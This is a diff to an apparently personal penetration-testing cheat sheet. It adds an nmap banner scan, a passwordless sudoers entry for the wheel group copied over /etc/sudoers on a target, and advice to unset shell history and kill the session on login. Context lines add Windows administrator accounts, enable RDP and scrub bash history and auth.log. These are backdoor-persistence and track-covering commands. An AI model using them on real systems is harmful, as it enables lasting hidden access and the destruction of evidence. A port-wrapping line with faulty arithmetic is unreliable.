@@ -151,6 +151,10 @@ nmap --script vuln [target]  (runs all scripts in vulnerabilities category)
 nmap -v -p 80 --script all 192.168.0.5  (all NSE scripts, could take over an hour)
 
 
+probably my favorite go-to: (ports come from your previous "all-ports" scan)
+sudo nmap -p 22,80,443,5901 -sV -O --script=banner 10.11.1.71
+
+
 banner grab with netcat:  nc -nv [port]
 banner grab with telnet
 banner grab wit ncat: ncat -C 
@@ -867,6 +871,18 @@ adduser bill
 passwd bill
 usermod -aG wheel bill
 
+Modify sudoers file
+-normally on a system you use visudo to change this file (as sudo or root). On target, you may want to simply copy the file, then uncomment the below line:
+# Uncomment to allow people in group wheel to run all commands
+# %wheel    ALL=(ALL)   ALL
+
+# Same thing without a password
+ %wheel ALL=(ALL)   NOPASSWD: ALL
+
+### Make sure to use the file and match the syntax on the target, don't copy/paste from this file for your entry, less likely to have syntax errors
+root$  cp /tmp/modified-sudoers.txt /etc/sudoers
+
+
 Windows add administrator user:
 net user /add [username] [password]
 net localgroup administrators [username] /add
@@ -880,7 +896,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 netsh advfirewall firewall set rule group="remote desktop" new enable=No
 
 
-rdesktop [targetip]
+rdesktop [targetip]             (simpler syntax, helpful for IDing systems sometimes)
 
 xfreerdp /size:1024x768 /cert-ignore /v:10.12.1.124:3389 /u:username              (better! Handles more security stuff)
 
@@ -1277,13 +1293,15 @@ net session \\[targetIP] /del /y
 delete entries out of .bash_history
 history -d 2038     (specific entry with plaintext password, etc)
 history -cw        (clear all entries) 
-make sure your last command is not in their either!
-Worst case: unset HISTFILE then kill -9 $$
+make sure your last command is not in there either!
+Worst case: unset HISTFILE then kill -9 $$              as soon as you login
 
 Clean up scripts
 Delete your tools off the box
 Check /tmp
 Auth.log
+
+I am not a tradecraft guy, don't rely on the above haha. 
 
 
  
@@ -1299,4 +1317,3 @@ type    ://   username   :password   @   site   /resource
 port wrapping ports above 65535 (netcat listener on 70000 for example, will listen on 4464. 70k – 4464 = 65535)
 
  
-
